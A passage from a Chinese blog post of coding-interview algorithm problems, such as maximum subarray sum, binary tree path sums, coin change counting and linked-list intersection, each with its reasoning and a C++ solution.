<li>C++标准库有两个接口可以直接实现，一个排序，一个去重</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; num) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; input;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">            <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">            cin &gt;&gt; tmp;</span><br><span class="line">            input.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sort</span>(input.<span class="built_in">begin</span>(), input.<span class="built_in">end</span>());</span><br><span class="line">        input.<span class="built_in">erase</span>(<span class="built_in">unique</span>(input.<span class="built_in">begin</span>(), input.<span class="built_in">end</span>()), input.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : input) &#123;</span><br><span class="line">            cout &lt;&lt; tmp &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="连续子数组的最大和"><a href="#连续子数组的最大和" class="headerlink" title="连续子数组的最大和"></a>连续子数组的最大和</h1><h2 id="题目-21"><a href="#题目-21" class="headerlink" title="题目"></a>题目</h2><p>HZ偶尔会拿些专业问题来忽悠那些非计算机专业的同学。今天测试组开完会后,他又发话了:在古老的一维模式识别中,常常需要计算连续子向量的最大和,当向量全为正数的时候,问题很好解决。但是,如果向量中包含负数,是否应该包含某个负数,并期望旁边的正数会弥补它呢？例如:{6,-3,-2,7,-15,1,2,2},连续子向量的最大和为8(从第0个开始,到第3个为止)。给一个数组，返回它的最大连续子序列的和，你会不会被他忽悠住？(子向量的长度至少是1)</p>
<h2 id="思路-23"><a href="#思路-23" class="headerlink" title="思路"></a>思路</h2><ul>
<li>动态规划</li>
<li>找函数，以第$i$个元素结尾的最大和是$f(i)$，则第$i + 1$个元素结尾的最大和应为$max(f(i) + array[i - 1], array[i - 1])$</li>
<li>所以可以表示为$f(i + 1) &#x3D; max(f(i) + array[i - 1], array[i - 1])$</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">FindGreatestSumOfSubArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; array)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxTail = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> max = <span class="number">0x80000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : array) &#123;</span><br><span class="line">            <span class="comment">// f(i + 1) = max(f(i) + array[i - 1], array[i - 1])</span></span><br><span class="line">            maxTail = (maxTail + tmp) &gt; tmp ? (maxTail + tmp) : tmp;</span><br><span class="line">            max = max &lt; maxTail ? maxTail : max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="二叉树中和为某一值的路径"><a href="#二叉树中和为某一值的路径" class="headerlink" title="二叉树中和为某一值的路径"></a>二叉树中和为某一值的路径</h1><h2 id="题目-22"><a href="#题目-22" class="headerlink" title="题目"></a>题目</h2><p>输入一颗二叉树的根节点和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。(注意: 在返回值的list中，数组长度大的数组靠前)</p>
<h2 id="思路-24"><a href="#思路-24" class="headerlink" title="思路"></a>思路</h2><ul>
<li>从根节点向下递归</li>
<li>维持一个vector放入经过的路径，返回时弹出最后一个元素</li>
<li>到根部则判断是否为所求，是则插入结果中</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">FindPath</span>(TreeNode *root, <span class="type">int</span> expectNumber) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; road;</span><br><span class="line">        <span class="built_in">FindPath</span>(root, expectNumber, result, road);</span><br><span class="line">        <span class="built_in">sort</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>(), comp);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">comp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a, vector&lt;<span class="type">int</span>&gt; b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.<span class="built_in">size</span>() &gt; b.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">FindPath</span><span class="params">(TreeNode *root, <span class="type">int</span> expectNumber,</span></span></span><br><span class="line"><span class="params"><span class="function">                        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;result, vector&lt;<span class="type">int</span>&gt; &amp;road)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不到根部，sum增加，road放入此节点，继续递归</span></span><br><span class="line">        expectNumber -= root-&gt;val;</span><br><span class="line">        road.<span class="built_in">emplace_back</span>(root-&gt;val);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span> &amp;&amp; root-&gt;left == <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">            expectNumber == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 查到根部，判断是否相等，相等则存入结果</span></span><br><span class="line">            result.<span class="built_in">emplace_back</span>(road);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">FindPath</span>(root-&gt;right, expectNumber, result, road);</span><br><span class="line">        <span class="built_in">FindPath</span>(root-&gt;left, expectNumber, result, road);</span><br><span class="line"></span><br><span class="line">        expectNumber += root-&gt;val;</span><br><span class="line">        road.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="二叉树的深度"><a href="#二叉树的深度" class="headerlink" title="二叉树的深度"></a>二叉树的深度</h1><h2 id="题目-23"><a href="#题目-23" class="headerlink" title="题目"></a>题目</h2><p>输入一棵二叉树，求该树的深度。从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。</p>
<h2 id="思路-25"><a href="#思路-25" class="headerlink" title="思路"></a>思路</h2><h3 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h3><ul>
<li>返回左节点最大深度和右节点最大深度的最大值加一</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 递归实现</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">TreeDepth</span><span class="params">(TreeNode *pRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">TreeDepth</span>(pRoot-&gt;left) + <span class="number">1</span>, <span class="built_in">TreeDepth</span>(pRoot-&gt;right) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="非递归"><a href="#非递归" class="headerlink" title="非递归"></a>非递归</h3><ul>
<li>类似广度优先遍历，不过是一次取出同一级别所有节点</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 非递归实现，广度优先遍历</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">TreeDepth</span><span class="params">(TreeNode *pRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> maxDeep = <span class="number">0</span>;</span><br><span class="line">        queue&lt;TreeNode *&gt; traversal;</span><br><span class="line">        traversal.<span class="built_in">push</span>(pRoot);</span><br><span class="line">        <span class="keyword">while</span>(!traversal.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="comment">// 获取当前层的节点数，此循环全部取出</span></span><br><span class="line">            <span class="type">int</span> length = traversal.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">auto</span> &amp;tmp = traversal.<span class="built_in">front</span>();</span><br><span class="line">                <span class="keyword">if</span> (tmp-&gt;left != <span class="literal">nullptr</span>) traversal.<span class="built_in">push</span>(tmp-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (tmp-&gt;right != <span class="literal">nullptr</span>) traversal.<span class="built_in">push</span>(tmp-&gt;right);</span><br><span class="line">                traversal.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            maxDeep++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxDeep;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="第一个只出现一次的字符"><a href="#第一个只出现一次的字符" class="headerlink" title="第一个只出现一次的字符"></a>第一个只出现一次的字符</h1><h2 id="题目-24"><a href="#题目-24" class="headerlink" title="题目"></a>题目</h2><p>在一个字符串(0&lt;&#x3D;字符串长度&lt;&#x3D;10000，全部由字母组成)中找到第一个只出现一次的字符,并返回它的位置, 如果没有则返回 -1（需要区分大小写）.</p>
<h2 id="思路-26"><a href="#思路-26" class="headerlink" title="思路"></a>思路</h2><ul>
<li>由于是字符，所以只有128位甚至更少，asscii可以显示的最大数</li>
<li>使用一个<code>int [128]</code>来统计各个字符出现次数</li>
<li>再次遍历找到第一个出现次数为1的字符</li>
</ul>
<h1 id="硬币方案数"><a href="#硬币方案数" class="headerlink" title="硬币方案数"></a>硬币方案数</h1><h2 id="题目-25"><a href="#题目-25" class="headerlink" title="题目"></a>题目</h2><p>有数量不限的硬币，币值为25分、10分、5分和1分，请编写代码计算n分有几种表示法。<br>给定一个int n，请返回n分有几种表示法。保证n小于等于100000，为了防止溢出，请将答案Mod 1000000007。</p>
<h2 id="思路-27"><a href="#思路-27" class="headerlink" title="思路"></a>思路</h2><p>n种硬币凑成sum的方案数，可以假设有$i$个第n种硬币，然后剩下的则是用n - 1种硬币凑成$sum - i * coins[n]$的最大方案数，即$dp[n][sum] &#x3D; \sum_{i &#x3D; 0}^{sum &#x2F; coins[n]}dp[n - 1][sum - i * coins[n]]$，经推导可得</p>
<p>$$ \begin{aligned}<br>dp[n][sum] &amp;&#x3D; dp[n - 1][sum - 0 * coins[n]] + dp[n - 1][sum - 1 * coins[n]] +…+ dp[n - 1][sum - sum &#x2F; coins[n] * coins[n]] \\<br>    &amp; &#x3D; \sum_{i &#x3D; 0}^{sum &#x2F; coins[n]}dp[n - 1][sum - i * coins[n]] \\<br>    &amp; &#x3D; dp[n - 1][sum] + \underbrace{\sum_{i &#x3D; 1}^{sum &#x2F; coins[n]}dp[n - 1][sum - i * coins[n]]}_{令sum1 &#x3D; sum - coins[n]} \\<br>    &amp; &#x3D; dp[n - 1][sum] + \sum_{i &#x3D; 1}^{sum1 &#x2F; coins[n] + 1}dp[n - 1][sum1 - (i - 1) * coins[n]] \\<br>    &amp; &#x3D; dp[n - 1][sum] + \underbrace{\sum_{i &#x3D; 0}^{sum1 &#x2F; coins[n]}dp[n - 1][sum1 - i * coins[n]]}_{dp[n][sum1]} \\<br>    &amp; &#x3D; dp[n - 1][sum] + dp[n][sum - coins[n]]<br>\end{aligned} $$</p>
<p>所以$dp[n][sum] &#x3D; dp[n - 1][sum] + dp[n][sum - coins[n]]$，代码实现上用一个一维数组去累加即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Coins</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">countWays</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coins[] = &#123;<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">25</span>&#125;;</span><br><span class="line">        <span class="comment">// 初始化为1，只有1种硬币时，所有都只有一种方案</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">// 从2种硬币开始</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="built_in">sizeof</span>(coins) / <span class="built_in">sizeof</span>(coins[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">            <span class="comment">// dp[i][j] = dp[i - 1][j] + dp[i][j - coins[i]];，从coins[i]开始，coins[i]以内可coins[i - 1]一致</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = coins[i]; j &lt;= n; j++) &#123;</span><br><span class="line">                dp[j] += dp[j - coins[i]];</span><br><span class="line">                dp[j] %= <span class="number">1000000007</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="计算1-2-3-…-n"><a href="#计算1-2-3-…-n" class="headerlink" title="计算1 + 2 + 3 + … + n"></a>计算1 + 2 + 3 + … + n</h1><h2 id="题目-26"><a href="#题目-26" class="headerlink" title="题目"></a>题目</h2><p>求1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。</p>
<h2 id="思路-28"><a href="#思路-28" class="headerlink" title="思路"></a>思路</h2><ul>
<li>主要运用逻辑与运算的短路特性，前一个false后一个将不会执行</li>
<li>计算可以强行累加或者运用公式$\frac{n(n + 1)}{2}$</li>
<li>运用公式则使用了乘法的位运算</li>
</ul>
<p>$$<br>x \times y &#x3D;<br>((y &gt;&gt; 0) &amp; 1) \times x \times 2^{0} + ((y &gt;&gt; 1) &amp; 1) \times x \times 2^{1} +…+ ((y &gt;&gt; 31) &amp; 1) \times x \times 2^{31} \\<br>x \times 2^n &#x3D; x &lt;&lt; n<br>$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">Sum_Solution</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> num = <span class="number">1</span> + n;</span><br><span class="line">        <span class="built_in">Sum_Solution</span>(sum, num, n);</span><br><span class="line">        <span class="keyword">return</span> sum &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">Sum_Solution</span><span class="params">(<span class="type">int</span> &amp;sum, <span class="type">int</span> &amp;num, <span class="type">int</span> &amp;n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 某一位为1时，加上数值num * 2^x</span></span><br><span class="line">        (n &amp; <span class="number">0x01</span>) &amp;&amp; (sum += num);</span><br><span class="line">        <span class="comment">// num *= 2</span></span><br><span class="line">        num &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// n为0则结束</span></span><br><span class="line">        <span class="keyword">return</span> n &amp;&amp; (<span class="built_in">Sum_Solution</span>(sum, num, n));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="链表的公共节点"><a href="#链表的公共节点" class="headerlink" title="链表的公共节点"></a>链表的公共节点</h1><h2 id="题目-27"><a href="#题目-27" class="headerlink" title="题目"></a>题目</h2><p>输入两个链表，找出它们的第一个公共结点。（注意因为传入数据是链表，所以错误测试数据的提示是用其他方式显示的，保证传入数据是正确的）</p>
<h2 id="思路-29"><a href="#思路-29" class="headerlink" title="思路"></a>思路</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ol>
<li>一个一个找节点是否相同</li>
<li>可递归可循环</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">FindFirstCommonNode</span><span class="params">(ListNode *pHead1, ListNode *pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> p1 = pHead1;</span><br><span class="line">        <span class="keyword">auto</span> p2 = pHead2;</span><br><span class="line">        <span class="comment">// 要么相等，要么同时为nullptr</span></span><br><span class="line">        <span class="keyword">while</span> (p1 != p2) &#123;</span><br><span class="line">            <span class="comment">// p1到尾部，p2后移</span></span><br><span class="line">            p2 = (p1 == <span class="literal">nullptr</span> ? p2 : p2-&gt;next);</span><br><span class="line">            <span class="comment">// p1到尾部，从头再来</span></span><br><span class="line">            p1 = (p1 == <span class="literal">nullptr</span> ? pHead1 : p1-&gt;next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="有点思考的解法"><a href="#有点思考的解法" class="headerlink" title="有点思考的解法"></a>有点思考的解法</h3><ol>
<li>如果有相同节点，必有公共尾部</li>
<li>从中间某个节点开始相同</li>
<li>先计算长度，然后从尾部公共长度开始找</li>
<li>一共遍历三次</li>
</ol>
<h3 id="最骚解法"><a href="#最骚解法" class="headerlink" title="最骚解法"></a>最骚解法</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">FindFirstCommonNode</span><span class="params">(ListNode *pHead1, ListNode *pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> p1 = pHead1;</span><br><span class="line">        <span class="keyword">auto</span> p2 = pHead2;</span><br><span class="line">        <span class="comment">// 要么相等，要么同时为nullptr</span></span><br><span class="line">        <span class="keyword">while</span> (p1 != p2) &#123;</span><br><span class="line">            p1 = (p1 == <span class="literal">nullptr</span> ? pHead2 : p1-&gt;next);</span><br><span class="line">            p2 = (p2 == <span class="literal">nullptr</span> ? pHead1 : p2-&gt;next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol>
<li>如果长度相同，第一遍出结果</li>
<li>长度不相同，第一遍找到差值，第二遍出结果<ul>
<li>假设长度分别为<code>a、b，a &gt; b</code></li>
<li>第一遍p2先跑完指向第一个链表，p1走到第一个链表<code>a - b</code></li>
<li>在p1走完时，p2走到第一个链表的<code>a - (a - b) = b</code>长度位置</li>
<li>p1指向第二个链表，这时两个指针指向相同长度的链表</li>
<li>一起走，找到公共节点则返回，找不到会同时到nullptr，返回</li>
</ul>
</li>
</ol>
<h1 id="数组中重复的数字"><a href="#数组中重复的数字" class="headerlink" title="数组中重复的数字"></a>数组中重复的数字</h1><h2 id="题目-28"><a href="#题目-28" class="headerlink" title="题目"></a>题目</h2><p>在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 例如，如果输入长度为7的数组{2,3,1,0,2,5,3}，那么对应的输出是第一个重复的数字2。</p>
<h2 id="思路-30"><a href="#思路-30" class="headerlink" title="思路"></a>思路</h2><h3 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h3><ol>
<li>搞一个bool型数组，访问过就写成true，找到第一个为true的</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Parameters:</span></span><br><span class="line">    <span class="comment">//        numbers:     an array of integers</span></span><br><span class="line">    <span class="comment">//        length:      the length of array numbers</span></span><br><span class="line">    <span class="comment">//        duplication: (Output) the duplicated number in the array number</span></span><br><span class="line">    <span class="comment">// Return value:       true if the input is valid, and there are some</span></span><br><span class="line">    <span class="comment">// duplications in the array number</span></span><br><span class="line">    <span class="comment">//                     otherwise false</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">duplicate</span><span class="params">(<span class="type">int</span> numbers[], <span class="type">int</span> length, <span class="type">int</span>* duplication)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">count</span><span class="params">(length, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count[numbers[i]]) &#123;</span><br><span class="line">                *duplication = numbers[i];</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            count[numbers[i]] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="不骚不行，就是要骚"><a href="#不骚不行，就是要骚" class="headerlink" title="不骚不行，就是要骚"></a>不骚不行，就是要骚</h3><ol>
<li>就用原数组搞事情，访问某个数，以它为索引的地方加上n</li>
<li>找到以数索引大于n的，返回这个数</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Parameters:</span></span><br><span class="line">    <span class="comment">//        numbers:     an array of integers</span></span><br><span class="line">    <span class="comment">//        length:      the length of array numbers</span></span><br><span class="line">    <span class="comment">//        duplication: (Output) the duplicated number in the array number</span></span><br><span class="line">    <span class="comment">// Return value:       true if the input is valid, and there are some</span></span><br><span class="line">    <span class="comment">// duplications in the array number</span></span><br><span class="line">    <span class="comment">//                     otherwise false</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">duplicate</span><span class="params">(<span class="type">int</span> numbers[], <span class="type">int</span> length, <span class="type">int</span>* duplication)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="comment">// 获取原始数据</span></span><br><span class="line">            <span class="keyword">auto</span> tmp = numbers[i] &lt; length ? numbers[i] : numbers[i] - length;</span><br><span class="line">            <span class="comment">// 如果对应位小于length证明没有被访问过</span></span><br><span class="line">            <span class="keyword">if</span> (numbers[tmp] &lt; length) &#123;</span><br><span class="line">                <span class="comment">// 访问它，增加length</span></span><br><span class="line">                numbers[tmp] += length;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 访问过，就是它了</span></span><br><span class="line">            *duplication = tmp;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="数字在排序数组中出现的次数"><a href="#数字在排序数组中出现的次数" class="headerlink" title="数字在排序数组中出现的次数"></a>数字在排序数组中出现的次数</h1><h2 id="题目-29"><a href="#题目-29" class="headerlink" title="题目"></a>题目</h2><p>统计一个数字在排序数组中出现的次数。</p>
<h2 id="思路-31"><a href="#思路-31" class="headerlink" title="思路"></a>思路</h2><ul>
<li>排序数组二分查找即可</li>
<li>当然用标准库啊</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">GetNumberOfK</span><span class="params">(vector&lt;<span class="type">int</span>&gt; data, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp =</span><br><span class="line">            <span class="built_in">equal_range</span>(data.<span class="built_in">begin</span>(), data.<span class="built_in">end</span>(), k);</span><br><span class="line">        <span class="keyword">return</span> tmp.second - tmp.first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="数组中只出现一次的数字"><a href="#数组中只出现一次的数字" class="headerlink" title="数组中只出现一次的数字"></a>数组中只出现一次的数字</h1><h2 id="题目-30"><a href="#题目-30" class="headerlink" title="题目"></a>题目</h2><p>一个整型数组里除了两个数字之外，其他的数字都出现了两次。请写程序找出这两个只出现一次的数字。</p>
<h2 id="思路-32"><a href="#思路-32" class="headerlink" title="思路"></a>思路</h2><ol>
<li>都出现了两次，说明异或为0</li>
<li>只有两个出现了一次，那么异或结果就是他们俩的异或</li>
<li><code>0 ^ 1 = 1</code>，为1的是两个数字不同的位，以此为标准分开两个数组分别异或</li>
<li>两个结果就为异或结果</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">FindNumsAppearOnce</span><span class="params">(vector&lt;<span class="type">int</span>&gt; data, <span class="type">int</span>* num1, <span class="type">int</span>* num2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nor = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 先把所有数字异或，结果为两个单独出现的数字的异或</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : data) &#123;</span><br><span class="line">            nor ^= tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> bitNum = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 找到第一个不同的位</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nor &amp; <span class="number">0x01</span>) &#123;</span><br><span class="line">                bitNum = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            nor &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bitNum = <span class="number">1</span> &lt;&lt; bitNum;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据此位将所有数字分成两组进行异或，最终得到结果</span></span><br><span class="line">        *num1 = <span class="number">0</span>;</span><br><span class="line">        *num2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : data) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp &amp; bitNum) &#123;</span><br><span class="line">                *num1 ^= tmp;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            *num2 ^= tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

